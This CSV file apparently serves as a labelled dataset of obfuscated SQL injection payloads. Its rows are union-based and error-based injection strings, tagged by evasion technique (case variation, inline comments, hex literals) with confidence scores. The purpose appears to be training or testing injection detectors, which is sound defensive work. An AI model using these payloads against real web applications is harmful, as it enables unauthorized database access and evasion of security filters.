payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1'+ ( SeLECT NziJ\where (SelECT 0X1550) LIkE 0O0O0x1590 anD row! ( (SElEct'(SelECt[(SeleCt (sELEcT^(seLeCt 0x135D))))),0x1d2D :) >}%(%=sELect cOUNT ( -* ) _,coNCaT) ( 0X0x6o0O176717730A0B1010061, ( SelEct { ( ELT! ( }0o94182=0X0B11111001D,(SelECt (SeLeCT/0x0x0o1))'/*) ~Lve<=A<zxYB ""E8P*/ ) ~) )^ ,0B0X0o1365a787a51,flOOr* ( ;R aNd ( 0O0x0 ) *(SElECt (SElEcT (sElECT (SeLeCT (SELECT 2))))) ) /*E67_^VA(Gunr:*/ ) :x frOM (* sElEcT (seLeCT (SELECT (sELeCT (SElect 0X14Ac)))) uNioN seLecT 0xEAB UNIOn""seLeCT 0O0Xf3e UNioN SelEcT 0O0x0o0b1101111115110 )% A gROUP By*X }) ) +'",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"8B3O2B1X0O0O8B0b1101110%'!))_ ?UNIoN!aLl/*;XjC*O*/seleCt nUll,nuLL--",union_based,unknown,case_variation|inline_comment,0.8,rule,sqliv5_json,unknown
"4b0b0O0B0B111O0B10011o0b1000x0O0X0O0o6b8B16x0O3B2o0X4o0O7X9b0b0B106b20';in.bOolEAN;mode@%) ;;UnioN?ALl*seLECt{NUlL,nuLL,nuLL,nUll,nUlL,NULL,NUll,NuLl,NuLL--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"1""/*c92P A_*/&) ;aS/**/upyn<wheRE 0b0B0b0B00000000000011101000111011010001000041111/|LiKe< (SElECT^0X1829) uniON>aLl selEcT(nULL,null,NULL,null,nuLl,null,nUll,NuLl,NuLl,nUlL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0O0O0O3o0b3b0b0b110o2b0o5o7b0O0B6B0B0B4x1o0o11o0B10121100""?unIon?All%SELEcT&nULl,nULL,NuLl,NUll,nUlL,NulL--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0o0B0b1 WHErE""3O0B1111171101101*=/*nM|OVZnF*/(sELeCT]0x0B0o5f6D) UNion ALl;SeLeCt NuLL,nUlL,NuLl--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"1'+ (} seLeCT qUgU wheRe 2257& =!:(SELEcT (SElEct (SELEct 2287)))}ordEr bY 0x1 aNd (SElecT 1754) != 1755 oR False && ""$P""!=""$pM""#%Sb",union_based,unknown,case_variation,0.8,rule,sqliv5_json,string_double_quote
"0x0x6o0""@WHEre~8X3O0X5x0X5b5o5Ac{=%6X0x2100~UnION`ALl/*8x3B110\<zMYBC/QLz;jj3o1mefe"",UIy;.sep Jmki*/SELEcT\null,NuLL,NUll,null--",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0o0o0x0b0b0b0O4O0b102'(WhERe&0B0b100o0b3b6X3o0O8B0O4O0X6xE0xe%-=/*Bm4z5* A3vsi~e55$`cE;i H, OR False#3-J;*/^(seleCt|9O0b0B1101111101000)(UnIoN/ALl SelecT'nUll,nuLl,NULL--rUC",union_based,unknown,case_variation|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0o0x0B10' IN~BooleAn MODe[;) +UnION ALL;sELEcT NUll,NuLl,nULL,NuLl,NuLL,nULL,null,NULl And ;`(sELect~0o0X1)^AnD~0O0x1751 nOt likE (selECT!0O0o0X0b0B1010101060010) OR<0X1ccC not Like 0X1cCC*oR ""!Z"" noT LIkE ""!Z"" OR (sEleCT (select (SELeCt (sELecT (SELECT 1876)))))<>(select 0O3524) AND TRUE#^BzUq",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"1O0b0B0b11101101108%"";/*!(bya0X0o0x0X0jF:0o6D+]H0O141{h<?*/) OR:FALsE AnD TrUE Or<(SElEct~(sELECt (SeLECt(0x0))) OR fALsE OR False or (Select (SElect (SelecT 0X0))) AND (SELECT 1)#/*X`FKKpjt*/%uNion.ALl sELECT`nuLL,NUll,NUlL,nulL,nuLl,Null,NUll,nUll,NUll,Null}Or False#Mqcwp",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"7""}=)&/+aS drrx_WHERE|0b0B10404410111001 &%LiKe ;~7o4o1x0b6b0o0X0B0o25b0x6o11 union`All SElEct""null,nulL,null--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0x9x0B4X7o0b110""; ) > )^? ; )]&<uNion ALl sELecT.nUlL,nUlL--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"1' anD roW ( 0x785d,(sELeCt (sElEct 7X1d2d)) ) > (~ SelECt cOUnT ( * .) ,ConCat= ( 9X3b19011510110111801111010a0O107, ( sELEcT ( eLt ([ 0x185d )LikE 0x185d,0o0X8$ ) ) )\',0B0x0o1385A0O1422a71,flo or; ( R && ( %0O0/*if-I\*/!); *(SElEcT (seLEcT 0X0o0)) )! ) x froM : ( SELect (seLeCt (SElECt (SeLEcT[5192))) UNiON sElECt (SELECt 3715) unIOn seLeCT (SElect 0xe2F) UNIoN selECT 0X1Bf6 ) |a grOup By X ) ; ANd 'eOvg' lIkE{'eOvg",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"1% && RoW ( (SElEct (seLECT 6237)),7469 ) *> ( SELEcT COuNT>'( * ) ,COnCat /*n])X?uIXM|x *(sElect 5);^,G*/( 0X0b11011010110111001111010a0O107, ( seLECt ( ElT ( 0X185b liKE;0X0B10111100D,(sELEcT (SeLeCt (selEct (SElECt 1)))) ) )~ ) ,9x727a767A71,FlO OR, ( raND (& 0b0 ) *(sELecT 0x2),. ) ) X fROm & ( sELecT 0X0X0b70110101030 Union&sElecT 3785 unioN sElect (seLeCT 0B111101011011) Union sElEct (seLect (SELECT 7158)) ) a gRoUp by x ])",union_based,unknown,case_variation|inline_comment,0.8,rule,sqliv5_json,unknown
"0o6' iN&BoOLEAN mOdE*<)T~DM*/*ja(@T6 a$*/ UNIon/**/ALl`SELEct nuLL,NULL,NuLL,NuLL,nuLl,nuLL AnD (selEct (SeLECt (SELECT 3035))) nOt LIkE (SelEcT (SelECt (selEct (sELeCt 0XC5e)))) oR False#@ <0o0b105tXErq",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"8X0o0X5O4B0o4O0b0o2b0O0B0B1110101001100001000110010110010100110101000100011001101001000X0B0b0x0x4e'?;)~/*HnVr/r aGy?E)@r^E8x0b100r,avEH i,Aj2JI,""nV]L-?H[MaOmxd?7m6*/;uNiON`all~SelEct NuLl,nULL,null,NuLL,nulL,nUll,null,nulL,nuLL,NuLL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0B0b0b0b11B0O5O2O0B100O4O6o9X4b0B0o0o6b0b05`*.)[ ;`)`$+'unION""aLl-sElEcT/NUll,nulL,NuLl,NulL,NULl--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"1o2X0O0X9O0x0b0b1011001100'!$) `+uNIoN aLl=sELECT nULL,NUll OR!""T""?NOt\lIKe ""t""&And trUe?Or<faLsE#UGe",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0b0o0o4b9""% ), [uNion+aLL|SeLect NULl,NulL'OR/*GCVIH`8o2r_Ea0B141019 aEOb15O_s[ Z')t!zIw\*/""C"" Not}lIKE ""C""/* 8_w */ AND }""N"" NoT liKe ""N("" Or "";[r9"" LIkE "";[R0o0o7"" aNd TRue or False aNd tRuE OR (SELECT (SELECT 0))#.#;9o2DZi-~>T<d.H",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"7X0B0X1 /**/ )? / ) % ?uniON/*bz:7S*/ALl seLecT_NULl,nULL,NuLl,nULl,nULl,NulL,NUll+and:TRUe OR.(SeLect 0xD8);nOT In (0X0b11010121,(SelecT (sELEct;(seLECt (Select 216)))),(sELEct (selEcT 0O0o0XD9)));aNd True> && `(SeleCT 0B101X0O1) or 'Y4P' NOt LIKE 'Y4P' && 0x5 && (SELEct 1) OR 0X9997=(Select 6552) and tRUe#`csM+",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,in_clause
"0o6O2B0b1O1o2O0b101X5b0b0B0B1000b140x3x4b0O0X0X4b7B50b2O0o11x0O2b0b0b10001111%' } )< >])/ ? LIkE? >UNIon;all%SEleCT&nULL,nUll,NuLL,nULl,Null,NULL--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0O1 ) ANd |Row (( 0X0X0X0X0X0x0B10111001d,0X0x5B1D1D ) > <( SeLeCT CoUnT ( * ) ,COncat -( 0O0x7171806A71, *( SeLeCt * ( elt ( (seleCt (SeLect (SeleCt 0X185D))) _LiKe (seleCt 1X155D),0X1'@ )}` ) ) ,0x0X4cDa7o1337a0x47,flo< OR (( ranD; ( 0X2 ) *6x0b10} [) ? ) OR FAlsE OR FAlSE && (SELeCt (seLect (sELecT (sELECt (sELEcT (SELECT (SELECT (SELECT (SELECT 1))))))))) Or FaLSe AND True#[X FRom% ( sELeCt (SeLECT 0X0X0x1448) uNIOn SELeCt (sELecT (SELEcT (sELeCt 0b111011001001))) unIon SelEcT 1x0xF0B0x5B@Union SEleCt 0O0X0X0Bf5, ) A grOuP by-X <) anD ( 0O0X6o311C LiKe 5520TJwsiVF V",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"0B0O8x0O0O0b10B0x0B8x0B0X6X35bx0b0B11101C0B1001X3o0B0X0X67d'::()_<<})) ~.;)</*.</][VvMzv0O3X0B10fC/Btk?S*/.uNiON:ALL:sELeCT`NUlL,nuLl,NulL,null,NuLL,nULL,NULL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"6%'*UNION%alL seLEct%NULl,nULl,NUlL,NuLl,nUlL,nUll ;OR 0x0Xcee LIKe (seLEcT 0x206F) Or}(SEleCt/**/0b0b10010001100001010101000000101100100100100011) NOT LIKE (SElECT (SeleCt/0x21BB))#tywt!",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"4' ) or ]row (/*_ZvIfM_e`g:(sELect (SeLeCT 0))`pk0[Jk;G*/ 1x4X2cb,0X1D0x9a ]) > ( ?SELEct!cOUnt ( * ;) ^,CoNcat<`((\5x7171706A0X0O57, ({ sELeCt $ (; ELt: ( 0o0x415 likE,0X0X10F,0x6 ])( }+) <: ) !,0x0X2cDA767A0O0X0B110o0B0X0x0B10F,flOoR ;(] rANd ( ](sELecT 0x0B110) ):^*5X2 ~) ? %) x fROm ( SEleCt[0x2623 uNION%sEleCT 2X15D4 UNIOn}seleCt 9xBeB uNiON SElecT 0B6X0O4c4 ) A grouP By X ) ?",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"8b8O8O0b4o0B0O2X0O0B0B0B6O7X0B0B0O0B7086b9B5009' IN;BOOLeAn/*}uD|c.M50f(uk;}J)m>(SELECT~(selecT (SEleCt>8)))%x!IUV*/mOdE> )~ ~UNION alL:selEct|NUll,NULl,nUll,nulL,nUlL,nuLL,nulL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"4%"" ) ;` ) < ) uniOn ALL(SelECT nUlL,NULl,NuLl,NUlL'anD trUE\and 0o0b0o8 or^FAlsE OR False || False && True OR False#o",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0O3b5o0o3B0x7O0'/*xdTn9o0o0b111~%(.`y0O74Nku%xdH_(y >8Nitc+.Z-N{P}_N)BPa)P] jbo.h( */))\|?WherE?0O11b0o215X0O9o2x0xe0b0B0b1X0X8O10e)=~(sEleCt$(SeLeCT\0o0O0b0o8x9b0B1001O0b0o20531));UNiOn.AlL=SElEct~Null,nulL,NULl,nulL,null,nUll--",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0X0o7%""_ ) ) UnIoN all>SElEcT/*(SElEcT (SElect 0))>&y*Bi hYr */Null,nUll,NUlL,nULl,NULL Or~0o0o0o0O0O6 oR>(SELECT (sELeCt (SeLeCT (selECT 0)))){OR FAlse && truE or 't' = 'tE' oR ""s ;J"" !=%""s ;j"" aNd 1#\GB8`UeTS8",union_based,unknown,case_variation|inline_comment,0.7,rule,sqliv5_json,unknown
"4 /**/ )>| ) aS nnPE*WHEre 0O0B101100101011010=(SelEcT(3B0b0b10101100001110000110001011000100000101000010010111011000011001111011101001100100011110111111111101100101000111001011010000010010001100111100010110).UNIoN#alL sElEct/*0o11hwZL*/nulL,nUlL,NUll,NUlL,NUll,NulL,Null,nUlL,NuLL/**/OR?(seLeCt (SelEcT (sElECt (sElECt 4))))/*H*/Or ""-0o3 !or ""r("" nOt*like ""r(""#/""?nOT=""-0B0b0O0o0O5#/""#x"" 5mk""`L&p",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"1 WhERe (SElecT (seLeCT 0B0x0X0b11301111110))=(sElEcT 0o0x0x495) uNiOn AlL sElECT-nuLL,nuLL,nUlL,nuLL,nuLl[aNd;0o0x4 Or (sElECT (selEct 0)) OR fAlsE Or fAlsE or 1845!=(sEleCt (SELECT 1845)) AnD TrUE and(TRuE#3p(",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"3. ) AS WBcD wHErE*0x0B0X9da \LIKe 9606 or ROw ?( 0X0X0x0X0O23F,(sEleCt (SeleCT (sELECt 7562))) ) > (! sELEct CoUnT\ ( * *) ,cONCaT ;( 0x0b0o0X6D6e7Aa71, ( sElecT ( |ElT (} 0x0o6x415 LIKE (SelEct\(SElecT 1045)),(seLEcT (sEleCT (selEcT 2))) .%) ) + )~ ,0X0O1315a0X0o1377A91,flOor_ ( RanD ;( 0' ) *0x2 *) ) x fROM} *(` sELect 0b10000100601030 UNIOn select;5584 UNion sELecT$(SElecT (SelEct 0xF2b)) uniOn SELECT (sEleCt (seLeCT (seleCT 2210))) ) A gRoUp By X ) Or 'Z' Not= 'Z' aNd tRuE AND tRue oR ']' NoT like/**/ ']'&And tRuE && ""T ""=""t "" oR FalSE or falSe And true oR FAlsE OR fALSe And 1 and TRUE --",union_based,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.8,rule,sqliv5_json,unknown
"0X9X1%"" union AlL~SeLeCt NulL AnD (SELECT 7)<aND (seLeCT (SELECT 1))#oVx",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"1'+) (< SelECT 'mGRJ' wheRe?(SElEcT (SElecT (SelECT (SELECT 4514)))) LiKe 0x2140 Or Row ( ](SELECT (SELECT 1055)),(SEleCt (select 7568)) ) > ( sELect Count (!<* }) ,cONCAt ( 5O20x7170701a71, ( select\ ( eLT ( 8b15500010101 lIKE> (SeLEcT 0b2x415),0O1 ) ! ) )/*(,gY,(*!tyG%4?*/ ,0x0b1011009110A3B1011111111a8O9b2o0o102,flO|| *( rAnd ( 0x0x2 ) *(sEleCt 0x0)> ) ) x FROM ( Select (seLECt 0x21f0).UnioN*SELect (sElECT 0xE00) UnIoN SeLecT 4xBeb:unioN sElect (SelECt (SelEcT (SELECT 1219))) ?) a gRouP!By X ) ) ) +'",union_based,unknown,case_variation|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0x4%'{unIoN}alL seLecT/* )Wv0o0B0b101B2`aRrL`o*/nulL,NuLl ANd.TRuE, AnD % TRUE aNd/**/trUe oR FALsE ANd TRUe#",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0o0o3x5X8b4b1',wHerE;0B101O8b1b1111101000x0o7X0b0B0o0B10E0O9x0x0O0O11f&> LikE;;not LIke/0b0o0b10011101011100111-uNion=ALl^SeLecT}NulL,NulL,nUll,NulL,NulL,nUlL,NULl,NUll,NUll--",union_based,unknown,case_variation|scientific_notation,0.8,rule,sqliv5_json,unknown
"0B110b0o171b0B0b1480O0o1O0o0B10191o9o0B0b111o0b0O0b146')- )$!> ) + $) _`UNiOn$ALl seLect/nULl,nUll,nuLl--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0X1b0B0O9B101B0O0b1010x0B0B7b5x6b2xab0B11100110x0X0o0X3o6B0b0B147xb'_"":) ~``) e^JH4QqBiEgX=kS{ :gG^$c_v8 */*U*""0B0b0B0X0B4xBbvU Fq5O8x0b0B100iz]fBWI{%^Fxn$r`a[+(sELeCt 9)*/}*) /`UNIoN}ALL SeLECt>Null,NULL,nuLL,NUlL,nulL,NuLL,null,NuLL,NULl--",union_based,unknown,case_variation|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0X8o0B0b0b0o5X0o0X3B6B0b0b1111100111011010110100010101011100101100%"")__)[ /*~a XM9bIa""d%*/{)| [ Union ALL&seLeCt[NUlL,NulL,Null,nuLl,NuLL,null,nUlL,NULL,NuLl--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"2b0b0x0O0o0X5""& $)= ). )> UNIon ALL SELECT NULL,NulL,NulL,NuLL or/*fgaO7*/FAlSE And )0b0O156B0b0b1011111000101111111111011011001010011101100110011011011001101001110110001001010001011111011111000010101111100101111011011111110100|nOT LIKE 0xeb5||'$?T'!='$?t') || (SeLeCT 0x6c4) noT IN ((sELect (seLECT 1731)),(seLecT (sELECT 1732)),0X6c5) OR)FaLSe AND ""Zs"" LikE ""ZS""#`Z;",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"1"" ) And ROw ( 0x185D,0b0110100101101 *) |> (; SeLeCT Count; ( * ) ,ConCAT ( 0X8X9C849aa41, ( seLeCt + ( eLt ( 0b1150001011101< Like (SElEcT (seLECT (SEleCT 6233))),0x1 ) =) ) ,0X731A767a71,FLO OR ( R and /*o&R/?KD_B0$*/ ( (sELeCt 0b0X0)? ) *0X2 ` ) ) X from ( sELeCT?0x1448 UNIoN sELEcT (select (SelECT (seLeCt 0Xec9))) unIoN SeLeCT (sELecT (seLEcT 3931)) uNion sElEcT (SEleCT (SEleCt (selecT (SELEct (SELECT 7198))))) ) A>group BY X ) && (( ""hyBU"" LIke ""hYBU",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0b7O0b0o0b0X8""^WHEre>0B1001b0B0b3O1o0b0X0B0b11X0b1111110010000""$=[;4o0B110010x2X0b0o0b0b110110000010;UNioN-aLl{sEleCt$nULl,nulL,NUlL,NuLL,NulL,nUll--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"1%' ` )] ) [ "" && ROw-\(\*5x181d,0X1d2d ) > }( seLECT!CounT ( *] ) },COnCAT ( 0X9X0o2X4288AAA71, <(""/SeLECT ( ELt ( (SELect 0o0X182F) /=\](SeLECT 0B0X183f),0X0B0b1 !) ) ) ,0o0X0X717a0O1375A71,FlOoR *( /*l(^(seLECT (seLeCT@(sEleCt (SELECT (SELECT 4)))))$f-*/rAND ( 3o5 <)+\*5b10 ) ) $x FROM ( selECt (SeLecT (SeLEct<5x0X0o0b1011111010)) UnIoN seLeCT 0XeB5 UnIon SelEcT 0B0Xf5b UNiON seLECt (SelEct (seleCT (sElECT (SelEct (seLeCt (select (sELEct 0X1eb2))))))) ) A)GrOuP By X ) aND ( ( ( '%' LiKe] '",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"5b3B0b11X3X4B6x0b1001x0o0b1010'<+)&`]UNION}ALl/*D_~*(sEleCT\(SELECT:(selEct.9b0X0B101)))~(slm4Da{tAf90v5(ei(=(bf0B1001J)PE}0x0b101] oR faLsE$aND (selECt (sElEcT 1))#x9!HAn)`rN5;@}*/SElEcT*NULL,nuLL,NulL,null,NulL,nULl,NUll,NUll,NuLL--!_:fM",union_based,unknown,case_variation|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"1%' ) aNd & rOw ( &0X185D,0x0b0o1D2d )= > ( Select cOUnt ( * ) ,cOnCaT ( 0x0O0b0B0B10010101010111001100111101010111110101010011110010111100070110100111100010a71, ( SelEct ( Elt ( 0X18F8 in (0b1105011111011,(sELeCT 0x18FC),(seLecT 0X1A29)),1x1 ~) ) + ) ,0X711A727a71,FLO or ( rAnd ,( (seLecT (seLeCT (select (SELECT (SELECT (SELECT 0))))))@ ) *(sEleCt (sElect 0x2))< ) )? x FROM; ( `SeLECt (SeLEct (SELEct (sELeCt 0x1448))){unIOn seLECt (selECt (SELect (SELECT 3785))) Union SeLeCT (seLeCt 0xF5b) UNION sElECT 0o0B0b1101111110115 ) a grOup BY X ) && ( '%'+= '",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,in_clause
"5"" ) && Row &( 0x185c,0x1eBD[ ) > (} SeLECT COUNt ( * ) ,CONcAT () 0X7171586a51,& ( SELeCT ( eLt ( (selEcT (SeLeCt 0X1853))=0b0X188D,(SelEcT (SELEct (SelecT 0x0B1))) ) )) "" ) ,0x717A767a2X47,FlO Or ( rAnd (\ (SElEct 0) ) ]*0o2 ) ) X FROm ( seLEct (SELECT (SELECT 8192))[UNIoN SElECT (SELecT 0x6F9) UniOn SeleCt 6b10Xf0o2B}uNION SelECT (SELECT (selecT (SElECt 0x1bce)))] ) A GROup By X ) and ( ""IjoP""?'like ""Ijop",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"1' )[ ) ; uniOn.AlL sElect""nulL,NULL""AnD 7O1 or (SELECT (SELECT (SELECT (SELECT 0))))#J",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
0O0O0O6%'/*3z or[ fAlsE/AND.(selecT 3380) not liKe (seleCt|0X574) anD (SeLect (SeLect 1))#.*/ ) ?UNion?AlL sEleCt}NUlL/*j*/aND<(SelEct 6)#.rB{'lAr,union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0B0b0o0b0o156o7X4B8B5o1""@UnIOn&ALl}seLect NUlL--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0X9o0o0o11X6b9' )`[ UNIon/*7Cc>/*(SELEct (selECT (SeleCT (SELECT 0X8))))|*/ OR ?[(sElECT (SeLEcT 0o0X0)) ANd (sELEcT$(SEleCt 0x59F))<>0X5a0?AND,TruE AND """"c,""=""""C,"" or faLse OR faLSE#^""L^&A*/AlL sElECT NULl,NulL,nULL,Null#T,rDlOWK",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"1-WheRe 0B0b1000011011010000111011101101001110 / =/*[(Select>(SELEcT^0X52e)) uNioN]ALl$SELEcT*NuLl,NuLl,NuLL,nULL,NulL,nUlL--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0X8' AnD Row-\( 3O0X185d,0o0x1d5x5B ) > /*7i}wS;(selECt (sELECT (sElECT (seLect (sELECt (SeLeCT 1))))))\|w\DT*/( sELECT coUnt ( * ) /,coNCAt ( 0X0b11011101111010110011040a71, ( SeLECT ( elt ( (seLEcT (seleCt 3X0X0o271D)) LiKe 0o0X0XB9D,(selEcT-(selecT (SELect (select (SELECT (sEleCT 0x1)))))) +) ; ) ) *,0x0o1314A767a0b1070061,FLoor ( rAnd^ ( 0o6 () (*(sElECT 0X2) ; ) )@ x FRoM' ( seleCT 0b0b0O0O0O0x2F0X4e unIoN sELeCt 0O15234 UNion SEleCt 0Xf5B UNion^sElecT 0o6X1bF6: ) a GRoUP bY X ) aNd'slOy' LiKe 'sloY",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"1' Or ( SeleCT 'kFyh' whEre (SelEct (sELecT (SELEcT (SelEct 4737))))>LiKE (sELECT 4737) oR Row ( (sELeCt 1045),(seLect 1562) ) > }( SElecT COuNt ( * ) ,CONCAt ( 0x0b11011010110115010110110a71, (/**/ SELECt & ( /**/elt ( (SELECT (SeLEcT 1043))=(seLECT (selEcT (seLeCt 1045))),0B1 ) :) ^ ) ,0x797A777a71,flO OR ( rAnd ([ 5o0x0= ) *(SEleCT 2) ) )- X FRoM ( SeleCT.(sELeCt 3465) uniOn SeLect 0X15d0b0 uNIOn sELeCt 3051 union seleCT{0O0x4BB ) A gRoup by X ) _ ) Or '",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0o4B2X8O0X0B':iN/or<(Select'0b0X0x1eae)=(selECT (sELEct (SELECT 7155))) And TRuE oR 0 or faLSE or FaLSE Or fAlse#BoOlEAN)moDe .)/*zIw0x2\*/ uNIon!All!SElEcT*nULL,nuLL,NUll,Null--0x7+gOI l1L",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"1"" ) wHeRE (SEleCt 7512) LIKE 0x0X1D58 *ANd roW ( (sELecT 6337),(SEleCT (SElECT 0x1D2D)) ) >* ( SelECT cOUnt ( * ) ,ConCAT ( 5b0O0x0x0X6D81FDA71, ( sELEcT _ ( ELt$ ( 0o14132 liKe (SeLECT 0O0X1885),(sELEcT 0x1) ) ) ) ,3x217a767a75,FlO Or ( RAnd ( (SELeCT (SELeCT 6)) ) *(SElecT (sELeCt 0x2)) ;) ) X fRom ( sElECT 0x0O0B1010001301000 uNIoN sEleCT (SeLECt 8785) uniON seLeCT (SELEct 0o7533) UnioN sELect 0o0X1Bf6 ); a gROuP By X )( anD 0X1D64 lIkE (seLecT (seLEct (SelEct 7523))) and TRue* AnD '`(SELECT (SELECT 7))@'='`(SeLecT (SELECT 7))@' Or FALSe aNd 'h!' nOt liKE 'h!Y' OR FalSE Or FalSE oR fALse --",union_based,unknown,case_variation|function_alternative|hex_string,0.7,rule,sqliv5_json,string_single_quote
"0B1'+@ (/*S^IWpg}E0b1cJO&Kjda*/ seLEcT(sxco WHEre (SeleCT (SeleCT Or 2676 NOT LIKE (SELECT 2676)#(sELect (seLect^(sELeCT 0X6bB)))))"" Like ?0b0o2x0X6B1010030001 uNIon AlL=seLECt null,nULL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0x1'+ _(| sELECT&'eoxk'""WhERE 0x0o9O0O0xE26 =@(sELeCt>(Select`(SElecT 8X19f6))) uniON/AlL SEleCt/*syp[R*/nULL,NULl OR$0o0 *oR FAlsE OR False#i<fsd_",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"9x9"" ) )) as Qejm wHeRE 0X5b0x0X0o63E likE/**/?(SelECt;(selEct[(SELect (sELEcT (SELECT (SELECT 9014))))))/**/UnION aLL Select NuLL,NuLL,NULl,nUlL,nuLl,NULl(And trUE or{(sELeCT (SELECT 0))#HRlV<",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0X5x0O0O0o0B3B0B0b0O0b10212005%""[><)_/*vdJ)x$};V/ZK{{VFAo*/;>)| ;!')""++UNIOn ALL*sELECT)nULL,nulL,Null--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
